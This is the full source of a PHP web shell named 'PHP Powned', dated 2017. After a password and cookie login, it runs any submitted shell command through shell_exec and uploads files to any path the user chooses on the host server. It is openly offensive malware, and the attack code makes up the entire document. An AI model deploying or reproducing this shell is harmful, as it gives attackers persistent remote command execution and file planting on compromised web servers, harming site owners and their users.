<!--------------------------------------------------------------------
# DEVELOPED BY Di0nJ@ck - September 2017
--------------------------------------------------------------------->

<?php
echo '<body style="background-color:#424242;">';

$password = 'your_password'; // Password
$padding = 'YvZhcqTq*h!^30I88O2e'; // Random Padding (REMEMBER TO CHANGE IT TO YOUR OWN)

if (isset($_COOKIE['powned_cookie'])) {
   if ($_COOKIE['powned_cookie'] == md5($password.$padding)) {
?>

<!-- ONCE AUTHENTICATED -->
<font style="float:right;" color="#F2F2F2"><b>PHP Powned</b></font><br /><br />

<fieldset style="border:2px solid #ffffff;opacity:0.5;border-radius:5px;background:#FE2E2E;">
<form style="float:left;color:#ffffff;" action='<?php echo $_SERVER["PHP_SELF"]?>' method="post">
<b>Run any command for the lulz:</b><br />
<input type= "text" name="command" />
<input type="submit" value="run"/>
</form>

<form style="float:right;color:#ffffff;"action="" method="POST" enctype="multipart/form-data">
<b>Full Remote Path:</b><br />
<input type="text" name="upload" /> (eg: /tmp/, C:\Users\Admin\Desktop\)<br /><br /> <!--- Remote folder to upload our file -->
<b>File Upload:</b><br />
<input type="submit" value="Upload!"/> <!---Choose the file to upload to the target host -->
<input type="file" name="file" />
</form></fieldset>

<?php 
   if(isset($_FILES['file'])){  
      $errors= array();
      $file_name = $_FILES['file']['name'];
      $file_size =$_FILES['file']['size'];
      $file_tmp =$_FILES['file']['tmp_name'];
      $file_type=$_FILES['file']['type'];   
      $file_ext=strtolower(end(explode('.',$_FILES['file']['name'])));
               
      if(empty($errors)==true){ // FILE UPLOAD
         move_uploaded_file($file_tmp,$_POST['upload'].$file_name);
         echo '<pre><span style="font-size: 11px; color: #FFFFFF;">';
         echo 'Upload: ' . $_FILES['file']['name'] . '<br />';
         echo 'Size: ' . ($_FILES['file']['size'] / 1024) . ' Kb<br />';
         echo 'Stored in: ' . $_POST['upload'];
         echo '</span></pre>';
      }else{
         print_r($errors);
      }
   }
   function exec_cmd(){
      if (isset($_POST['command'])){
         $exc = $_POST['command']; echo shell_exec($exc);
      }
   }
   echo '<pre><span style="font-size:11px;color:#F2F2F2;">';
   exec_cmd();
   echo '</span></pre>';
?>

<?php
      exit;
   } else {
      echo '<span style="color:#ffffff;opacity: 0.5;">Bad Cookie!</span>'; // Invalid cookie
      exit;
   }
}

// LOGIN INTO OUR WEBSHELL
if (isset($_GET['a']) && $_GET['a'] == 'login') {
   if (@$_POST['pass_id'] == $password) {
      setcookie('powned_cookie', md5($_POST['pass_id'].$padding), time()+900); // COOKIE EXPIRES IN 15 MIN
      header("Location: $_SERVER[PHP_SELF]");
   } else {
		//DONT DO ANYTHING
   }
}
?>

<font style="float:right;" color="#F2F2F2"><b>PHP Powned</b></font>
<form style="opacity: 0.5;" action='<?php echo $_SERVER["PHP_SELF"]; ?>?a=login' method="post">
<input type="password" name="pass_id" id="pass_id" />
<input type="submit" id="submit_id" value="Login" />
</form>